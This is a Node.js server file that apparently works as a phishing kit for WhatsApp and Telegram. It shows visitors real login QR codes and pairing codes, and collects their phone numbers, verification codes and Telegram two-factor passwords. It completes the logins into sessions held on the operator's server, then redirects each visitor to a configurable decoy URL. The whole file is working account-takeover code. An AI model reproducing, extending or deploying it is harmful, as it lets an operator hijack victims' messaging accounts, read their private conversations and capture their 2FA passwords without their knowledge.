const express = require('express');
const http = require('http');
const { Client, LocalAuth } = require('whatsapp-web.js');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const qrcode = require('qrcode');
const { Server } = require('socket.io');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.static('public'));

function getTargetUrl() {
    try {
        const data = fs.readFileSync('url.txt', 'utf8');
        return data && data.trim() ? data.trim() : 'https://google.com';
    } catch (e) {
        return 'https://google.com';
    }
}

// WhatsApp client map per socket id
const waClients = new Map();
// Telegram client map per socket id
const tgClients = new Map();

async function initWhatsApp(socket, phoneNumber = null) {
    if (waClients.has(socket.id)) {
        try { await waClients.get(socket.id).destroy(); } catch (e) {}
        waClients.delete(socket.id);
    }

    const client = new Client({
        authStrategy: new LocalAuth({ clientId: `wa_${socket.id}` }),
        puppeteer: {
            executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || '/usr/bin/chromium',
            headless: true,
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--single-process',
                '--disable-gpu'
            ]
        }
    });

    waClients.set(socket.id, client);

    client.on('qr', async (qr) => {
        if (!phoneNumber) {
            const url = await qrcode.toDataURL(qr);
            socket.emit('qr_code', { platform: 'whatsapp', image: url });
        }
    });

    client.on('ready', () => {
        socket.emit('authenticated', { platform: 'whatsapp', url: getTargetUrl() });
    });

    client.on('auth_failure', (msg) => {
        socket.emit('auth_error', { platform: 'whatsapp', message: msg || 'WhatsApp authentication failed' });
    });

    await client.initialize();

    if (phoneNumber) {
        const cleanPhone = phoneNumber.replace(/[^0-9]/g, '');
        try {
            // Request pairing code from whatsapp-web.js
            const pairingCode = await client.requestPairingCode(cleanPhone);
            socket.emit('pairing_code', { platform: 'whatsapp', code: pairingCode });
        } catch (err) {
            socket.emit('auth_error', { platform: 'whatsapp', message: err.message || 'Could not generate pairing code' });
        }
    }
}

async function initTelegramQR(socket) {
    if (tgClients.has(socket.id)) {
        try { await tgClients.get(socket.id).disconnect(); } catch (e) {}
        tgClients.delete(socket.id);
    }

    const apiId = Number(process.env.TG_API_ID || 0);
    const apiHash = process.env.TG_API_HASH || '';

    if (!apiId || !apiHash) {
        socket.emit('auth_error', {
            platform: 'telegram',
            message: 'Telegram API ID / API Hash set kora hoyni (Render Environment Variables-e TG_API_ID ebong TG_API_HASH din).'
        });
        return;
    }

    const stringSession = new StringSession('');
    const client = new TelegramClient(stringSession, apiId, apiHash, {
        connectionRetries: 3
    });

    tgClients.set(socket.id, client);
    await client.connect();

    try {
        await client.signInUser(
            { apiId, apiHash },
            {
                qrCode: async (qr) => {
                    const tgLoginUrl = `tg://login?token=${qr.token.toString('base64url')}`;
                    const qrDataUrl = await qrcode.toDataURL(tgLoginUrl);
                    socket.emit('qr_code', { platform: 'telegram', image: qrDataUrl });
                },
                onError: async (err) => {
                    socket.emit('auth_error', { platform: 'telegram', message: err.message || 'Telegram QR error' });
                }
            }
        );

        socket.emit('authenticated', { platform: 'telegram', url: getTargetUrl() });
    } catch (err) {
        socket.emit('auth_error', { platform: 'telegram', message: err.message || 'Telegram QR login failed' });
    }
}

async function initTelegramPhone(socket, phoneNumber) {
    if (tgClients.has(socket.id)) {
        try { await tgClients.get(socket.id).disconnect(); } catch (e) {}
        tgClients.delete(socket.id);
    }

    const apiId = Number(process.env.TG_API_ID || 0);
    const apiHash = process.env.TG_API_HASH || '';

    if (!apiId || !apiHash) {
        socket.emit('auth_error', {
            platform: 'telegram',
            message: 'Telegram API ID / API Hash set kora hoyni (Render Environment Variables-e TG_API_ID ebong TG_API_HASH din).'
        });
        return;
    }

    const stringSession = new StringSession('');
    const client = new TelegramClient(stringSession, apiId, apiHash, {
        connectionRetries: 3
    });

    tgClients.set(socket.id, client);
    await client.connect();

    try {
        const result = await client.sendCode({ apiId, apiHash }, phoneNumber);
        socket.emit('tg_code_sent', {
            phoneCodeHash: result.phoneCodeHash,
            phoneNumber
        });
    } catch (err) {
        socket.emit('auth_error', { platform: 'telegram', message: err.message || 'Failed to send Telegram code' });
    }
}

io.on('connection', (socket) => {
    socket.on('start_qr', async ({ platform }) => {
        if (platform === 'whatsapp') {
            await initWhatsApp(socket, null);
        } else if (platform === 'telegram') {
            await initTelegramQR(socket);
        }
    });

    socket.on('start_phone_login', async ({ platform, phone }) => {
        if (platform === 'whatsapp') {
            await initWhatsApp(socket, phone);
        } else if (platform === 'telegram') {
            await initTelegramPhone(socket, phone);
        }
    });

    socket.on('verify_tg_code', async ({ phoneNumber, phoneCodeHash, code, password }) => {
        const client = tgClients.get(socket.id);
        if (!client) {
            socket.emit('auth_error', { platform: 'telegram', message: 'Telegram session expired. Please try again.' });
            return;
        }
        try {
            const { Api } = require('telegram');
            await client.invoke(
                new Api.auth.SignIn({
                    phoneNumber,
                    phoneCodeHash,
                    phoneCode: code
                })
            );
            socket.emit('authenticated', { platform: 'telegram', url: getTargetUrl() });
        } catch (err) {
            if (err.errorMessage === 'SESSION_PASSWORD_NEEDED' && password) {
                try {
                    const { computeCheck } = require('telegram/Password');
                    const { Api } = require('telegram');
                    const pwdInfo = await client.invoke(new Api.account.GetPassword());
                    const passwordCheck = await computeCheck(pwdInfo, password);
                    await client.invoke(new Api.auth.CheckPassword({ password: passwordCheck }));
                    socket.emit('authenticated', { platform: 'telegram', url: getTargetUrl() });
                } catch (pErr) {
                    socket.emit('auth_error', { platform: 'telegram', message: pErr.message || '2FA password invalid' });
                }
            } else {
                socket.emit('auth_error', { platform: 'telegram', message: err.message || 'Invalid verification code' });
            }
        }
    });

    socket.on('disconnect', async () => {
        if (waClients.has(socket.id)) {
            try { await waClients.get(socket.id).destroy(); } catch (e) {}
            waClients.delete(socket.id);
        }
        if (tgClients.has(socket.id)) {
            try { await tgClients.get(socket.id).disconnect(); } catch (e) {}
            tgClients.delete(socket.id);
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
